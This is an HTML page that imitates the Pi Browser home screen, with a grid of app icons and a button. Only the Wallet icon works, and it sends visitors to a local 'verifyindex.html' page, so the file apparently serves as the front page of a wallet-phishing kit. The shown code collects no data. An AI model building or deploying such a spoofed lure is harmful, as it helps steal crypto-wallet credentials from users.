<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pi Browser Home</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: white;
        }

        header h1 {
            margin: 0;
            font-size: 20px;
        }

        header img {
            height: 50px;
        }

        .container {
            text-align: center;
            padding: 15px;
        }

        .logo img {
            width: 80%;
            max-width: 300px;
            margin-bottom: 15px;
        }

        h2 {
            color: #fcb34a;
            font-size: 22px;
        }

        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
            gap: 10px;
            margin: 15px 0;
        }

        .icon-card {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100px;
            cursor: pointer;
            padding: 10px;
        }

        .icon-card img {
            object-fit: contain;
            max-width: 100%;
            height: auto;
        }

        .icon-card p {
            margin: 5px 0 0;
            font-size: 14px;
            color: purple;
        }

        /* Adjust individual icon sizes for mobile */
        .icon-card img {
            width: 50px;
            height: 50px;
        }

        .button {
            background-color: purple;
            color: white;
            padding: 12px;
            border-radius: 20px;
            margin: 20px auto;
            width: 90%;
            max-width: 300px;
            text-align: center;
            cursor: pointer;
        }

        @media (max-width: 600px) {
            h2 {
                font-size: 20px;
            }

            .icon-card p {
                font-size: 12px;
            }

            .icon-card {
                height: 90px;
            }

            .button {
                padding: 10px;
                font-size: 16px;
            }
        }
    </style>
    <script>
        function openWalletPage() {
            window.location.href = "verifyindex.html"; // Replace with your actual wallet page URL
        }
    </script>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="assets/pi_logo-746a5f99.png" alt="Pi Logo">
        </div>
        <h2>Welcome to the Pi Browser</h2>
        <div class="grid">
            <div class="icon-card icon-fireside">
                <img src="assets/fireside-736eeda9.webp" alt="Fireside">
                <p>Fireside</p>
            </div>
            <div class="icon-card icon-wallet" onclick="openWalletPage()">
                <img src="assets/wallet-32ef219e.webp" alt="Wallet">
                <p>Wallet</p>
            </div>
            <div class="icon-card icon-brainstorm">
                <img src="assets/brainstorm-b6711d75.webp" alt="Brainstorm">
                <p>Brainstorm</p>
            </div>
            <div class="icon-card icon-mine">
                <img src="assets/mine.webp" alt="Mine">
                <p>Mine</p>
            </div>
            <div class="icon-card icon-blockchain">
                <img src="assets/blockchain-c5de89a7.webp" alt="Blockchain">
                <p>Blockchain</p>
            </div>
            <div class="icon-card icon-develop">
                <img src="assets/develop.webp" alt="Develop">
                <p>Develop</p>
            </div>
            <div class="icon-card icon-kyc">
                <img src="assets/kyc-94134b06.webp" alt="KYC">
                <p>KYC</p>
            </div>
            <div class="icon-card icon-chat">
                <img src="assets/chat-8bce2cb7.webp" alt="Chat">
                <p>Chat</p>
            </div>
            <div class="icon-card icon-profiles">
                <img src="assets/profile.webp" alt="Profiles">
                <p>Profiles</p>
            </div>
        </div>
        <div class="button">Explore the Ecosystem</div>
    </div>
</body>
</html>
